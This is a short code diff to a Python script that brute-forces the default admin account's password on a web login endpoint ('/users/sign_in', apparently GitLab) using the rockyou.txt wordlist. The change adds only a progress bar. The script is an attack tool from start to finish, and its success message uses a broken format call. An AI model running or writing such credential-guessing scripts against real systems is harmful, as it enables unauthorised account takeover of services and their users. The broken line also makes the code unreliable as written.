@@ -2,6 +2,7 @@ from hashlib import md5
 from re import findall
 
 from requests import get, post
+from tqdm import tqdm
 
 
 domain = ''
@@ -14,7 +15,7 @@ a = True if str((md5("admin@example.com".encode())).hexdigest()) == str(email) e
 if a:
     print("Standart user found, trying brute...")
     with open('rockyou.txt', 'r') as f:
-        for i in f.readlines():
+        for i in tqdm(f.readlines()):
             tmp = post(domain+'/users/sign_in', data={'user_login':'admin@example.com', 'user_password':i}).text
             if 'Invalid Login or password.' not in tmp:
                 print("Success! Password: {i}".format(i))
